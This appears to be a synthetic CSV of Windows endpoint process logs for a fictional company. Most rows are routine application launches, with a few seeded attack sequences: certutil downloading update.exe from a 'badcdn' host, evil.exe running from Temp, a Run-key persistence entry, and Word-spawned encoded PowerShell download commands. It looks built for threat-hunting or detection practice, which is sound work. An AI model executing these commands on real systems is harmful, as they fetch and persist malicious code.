timestamp,host,user,process,parent_process,command_line,ip,destination_port,user_agent
2026-04-01 08:35:00,sales-lt-02,charlie,slack.exe,explorer.exe,slack.exe --processStart slack.exe,1.1.1.1,443,slack-client
2026-04-01 08:36:00,hr-ws-01,irfan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
2026-04-01 08:37:00,fin-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",10.0.1.15,445,none
2026-04-01 08:38:00,sales-lt-02,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,edge
2026-04-01 08:39:00,eng-ws-01,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",52.95.110.1,443,outlook
2026-04-01 08:40:00,fin-ws-02,alice,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
2026-04-01 08:41:00,eng-ws-02,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-01 08:42:00,fin-ws-01,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
2026-04-01 08:43:00,hr-ws-01,irfan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
2026-04-01 08:44:00,fin-ws-02,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.2.20,445,none
2026-04-01 08:45:00,hr-ws-01,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",172.16.4.25,0,none
2026-04-01 08:45:00,hr-ws-01,helen,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-01 08:46:00,sales-lt-01,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
2026-04-01 08:46:00,hr-ws-01,helen,evil.exe,explorer.exe,C:\Users\helen\AppData\Local\Temp\evil.exe,192.168.10.9,0,none
2026-04-01 08:47:00,fin-ws-02,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-01 08:47:00,hr-ws-01,helen,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,192.168.10.9,0,none
2026-04-01 08:48:00,shared-jump-01,irfan,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-01 08:49:00,eng-ws-01,bob,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
2026-04-01 08:50:00,fin-ws-02,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-01 08:51:00,sales-lt-02,diana,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-01 08:52:00,fin-ws-02,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,chrome
2026-04-01 08:53:00,sales-lt-01,george,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
2026-04-01 08:54:00,eng-ws-02,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",142.250.183.14,443,outlook
2026-04-01 08:55:00,ops-ws-02,helen,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
2026-04-01 08:56:00,eng-ws-02,alice,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
2026-04-01 08:57:00,eng-ws-02,diana,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-01 08:58:00,sales-lt-02,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-01 08:59:00,hr-ws-01,helen,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
2026-04-01 09:00:00,sales-lt-01,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
2026-04-01 09:01:00,sales-lt-02,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
2026-04-01 09:02:00,ops-ws-02,helen,teams.exe,explorer.exe,teams.exe --type=renderer,45.33.32.156,443,teams-client
2026-04-01 09:03:00,ops-ws-02,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-01 09:04:00,ops-ws-02,ethan,code.exe,explorer.exe,"code.exe ""C:\Users\ethan\Documents\project""",192.168.1.12,445,none
2026-04-01 09:05:00,hr-ws-01,george,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-01 09:06:00,sales-lt-01,charlie,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
2026-04-01 09:07:00,fin-ws-02,alice,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
2026-04-01 09:08:00,eng-ws-01,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
2026-04-01 09:09:00,sales-lt-01,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
2026-04-01 09:10:00,eng-ws-01,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
2026-04-01 09:11:00,shared-jump-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",10.0.2.20,0,none
2026-04-01 09:12:00,ops-ws-02,bob,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
2026-04-01 09:13:00,shared-jump-01,julia,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
2026-04-01 09:14:00,shared-jump-01,julia,slack.exe,explorer.exe,slack.exe --processStart slack.exe,104.18.20.12,443,slack-client
2026-04-01 09:15:00,hr-ws-01,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",172.16.4.25,0,none
2026-04-01 09:16:00,fin-ws-02,ethan,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
2026-04-01 09:17:00,hr-ws-01,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",1.1.1.1,443,outlook
2026-04-01 09:18:00,eng-ws-01,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
2026-04-01 09:19:00,eng-ws-02,irfan,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
2026-04-01 09:20:00,hr-ws-01,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",1.1.1.1,443,outlook
2026-04-01 09:21:00,fin-ws-02,farah,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
2026-04-01 09:22:00,sales-lt-01,irfan,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-01 09:23:00,shared-jump-01,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
2026-04-01 09:24:00,eng-ws-02,charlie,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
2026-04-01 09:25:00,eng-ws-02,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,edge
2026-04-01 09:26:00,shared-jump-01,diana,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-01 09:27:00,fin-ws-02,ethan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,151.101.1.69,443,slack-client
2026-04-01 09:28:00,hr-ws-01,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,edge
2026-04-01 09:29:00,eng-ws-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",23.45.67.89,443,outlook
2026-04-01 09:30:00,hr-ws-01,charlie,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
2026-04-01 09:31:00,sales-lt-02,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,8.8.8.8,443,slack-client
2026-04-01 09:31:00,fin-ws-01,farah,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-01 09:32:00,eng-ws-02,bob,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
2026-04-01 09:32:00,fin-ws-01,farah,evil.exe,explorer.exe,C:\Users\farah\AppData\Local\Temp\evil.exe,192.168.1.12,0,none
2026-04-01 09:33:00,sales-lt-02,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",185.199.108.153,443,outlook
2026-04-01 09:33:00,fin-ws-01,farah,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,172.16.4.25,0,none
2026-04-01 09:34:00,fin-ws-01,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
2026-04-01 09:35:00,ops-ws-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",45.33.32.156,443,outlook
2026-04-01 09:36:00,fin-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",185.199.108.153,443,outlook
2026-04-01 09:37:00,ops-ws-02,julia,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
2026-04-01 09:38:00,fin-ws-02,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",10.0.1.15,445,none
2026-04-01 09:39:00,ops-ws-02,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,edge
2026-04-01 09:40:00,fin-ws-02,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
2026-04-01 09:41:00,eng-ws-01,helen,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-01 09:42:00,sales-lt-01,farah,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
2026-04-01 09:43:00,fin-ws-02,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",10.0.2.20,0,none
2026-04-01 09:44:00,ops-ws-02,farah,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
2026-04-01 09:45:00,hr-ws-01,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",192.168.10.9,0,none
2026-04-01 09:46:00,ops-ws-02,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",8.8.8.8,443,outlook
2026-04-01 09:47:00,eng-ws-02,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-01 09:48:00,eng-ws-02,julia,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
2026-04-01 09:49:00,ops-ws-01,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
2026-04-01 09:50:00,eng-ws-02,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
2026-04-01 09:51:00,hr-ws-01,alice,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
2026-04-01 09:52:00,eng-ws-01,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",192.168.10.9,445,none
2026-04-01 09:53:00,fin-ws-02,farah,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.10,0,none
2026-04-01 09:54:00,ops-ws-01,julia,outlook.exe,explorer.exe,"outlook.exe /recycle ""julia@company.com""",1.1.1.1,443,outlook
2026-04-01 09:55:00,hr-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
2026-04-01 09:56:00,ops-ws-01,george,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-01 09:57:00,sales-lt-02,charlie,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-01 09:58:00,ops-ws-02,charlie,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,52.95.110.1,443,zoom-client
2026-04-01 09:59:00,ops-ws-02,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,edge
2026-04-01 10:00:00,fin-ws-02,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",172.16.4.25,445,none
2026-04-01 10:01:00,sales-lt-01,helen,teams.exe,explorer.exe,teams.exe --type=renderer,45.33.32.156,443,teams-client
2026-04-01 10:02:00,sales-lt-02,helen,code.exe,explorer.exe,"code.exe ""C:\Users\helen\Documents\project""",10.0.1.15,445,none
2026-04-01 10:03:00,eng-ws-02,ethan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,104.18.20.12,443,slack-client
2026-04-01 10:04:00,eng-ws-02,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",10.1.5.12,0,none
2026-04-01 10:05:00,fin-ws-02,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
2026-04-01 10:06:00,fin-ws-02,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
2026-04-01 10:07:00,sales-lt-01,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",10.0.2.20,0,none
2026-04-01 10:08:00,ops-ws-02,helen,explorer.exe,explorer.exe,explorer.exe /background,10.0.2.20,0,none
2026-04-01 10:08:00,ops-ws-02,alice,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-01 10:09:00,fin-ws-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",10.0.0.10,445,none
2026-04-01 10:09:00,ops-ws-02,alice,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,python-requests
2026-04-01 10:10:00,ops-ws-02,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
2026-04-01 10:10:00,ops-ws-02,alice,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-01 10:11:00,eng-ws-01,irfan,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
2026-04-01 10:12:00,sales-lt-01,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",192.168.1.12,445,none
2026-04-01 10:13:00,sales-lt-02,irfan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,104.18.20.12,443,zoom-client
2026-04-01 10:14:00,sales-lt-01,julia,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-01 10:15:00,ops-ws-02,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,23.45.67.89,443,teams-client
2026-04-01 10:16:00,sales-lt-01,helen,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
2026-04-01 10:17:00,hr-ws-01,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,45.33.32.156,443,teams-client
2026-04-01 10:18:00,hr-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-01 10:19:00,hr-ws-01,farah,outlook.exe,explorer.exe,"outlook.exe /recycle ""farah@company.com""",185.199.108.153,443,outlook
2026-04-01 10:20:00,eng-ws-02,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,edge
2026-04-01 10:21:00,fin-ws-01,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,edge
2026-04-01 10:22:00,ops-ws-01,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,142.250.183.14,443,teams-client
2026-04-01 10:23:00,eng-ws-01,diana,explorer.exe,explorer.exe,explorer.exe /background,172.16.10.8,0,none
2026-04-01 10:24:00,shared-jump-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",172.16.10.8,445,none
2026-04-01 10:25:00,sales-lt-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",52.95.110.1,443,outlook
2026-04-01 10:26:00,ops-ws-02,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
2026-04-01 10:27:00,shared-jump-01,diana,teams.exe,explorer.exe,teams.exe --type=renderer,45.33.32.156,443,teams-client
2026-04-01 10:28:00,hr-ws-01,george,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
2026-04-01 10:29:00,ops-ws-02,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",172.16.10.8,0,none
2026-04-01 10:30:00,fin-ws-01,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-01 10:31:00,ops-ws-02,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
2026-04-01 10:32:00,eng-ws-02,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,chrome
2026-04-01 10:33:00,eng-ws-01,ethan,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
2026-04-01 10:34:00,fin-ws-02,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",104.18.20.12,443,outlook
2026-04-01 10:35:00,ops-ws-02,ethan,code.exe,explorer.exe,"code.exe ""C:\Users\ethan\Documents\project""",172.16.10.8,445,none
2026-04-01 10:36:00,hr-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
2026-04-01 10:37:00,sales-lt-02,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",45.33.32.156,443,outlook
2026-04-01 10:38:00,eng-ws-02,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",10.0.0.5,445,none
2026-04-01 10:39:00,fin-ws-02,diana,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
2026-04-01 10:40:00,fin-ws-01,helen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\helen\Documents\notes.txt""",10.0.0.10,0,none
2026-04-01 10:41:00,shared-jump-01,diana,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
2026-04-01 10:41:00,eng-ws-01,julia,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,winhttp
2026-04-01 10:42:00,ops-ws-01,charlie,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
2026-04-01 10:42:00,eng-ws-01,julia,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,python-requests
2026-04-01 10:43:00,fin-ws-01,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
2026-04-01 10:43:00,eng-ws-01,julia,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
2026-04-01 10:44:00,shared-jump-01,george,explorer.exe,explorer.exe,explorer.exe /background,10.0.2.20,0,none
2026-04-01 10:45:00,eng-ws-02,julia,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-01 10:46:00,eng-ws-02,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.0.0.10,0,none
2026-04-01 10:47:00,shared-jump-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",185.199.108.153,443,outlook
2026-04-01 10:48:00,ops-ws-02,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-01 10:49:00,ops-ws-01,alice,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
2026-04-01 10:50:00,eng-ws-02,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",151.101.1.69,443,outlook
2026-04-01 10:51:00,fin-ws-01,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-01 10:52:00,hr-ws-01,julia,code.exe,explorer.exe,"code.exe ""C:\Users\julia\Documents\project""",192.168.10.9,445,none
2026-04-01 10:53:00,sales-lt-01,helen,explorer.exe,explorer.exe,explorer.exe /background,10.1.5.12,0,none
2026-04-01 10:54:00,ops-ws-01,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,edge
2026-04-01 10:55:00,fin-ws-02,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
2026-04-01 10:56:00,ops-ws-01,alice,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
2026-04-01 10:57:00,fin-ws-01,helen,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
2026-04-01 10:58:00,hr-ws-01,farah,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
2026-04-01 10:59:00,sales-lt-02,alice,slack.exe,explorer.exe,slack.exe --processStart slack.exe,45.33.32.156,443,slack-client
2026-04-01 11:00:00,eng-ws-02,diana,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
2026-04-01 11:01:00,sales-lt-01,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.2.20,445,none
2026-04-01 11:02:00,sales-lt-01,helen,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
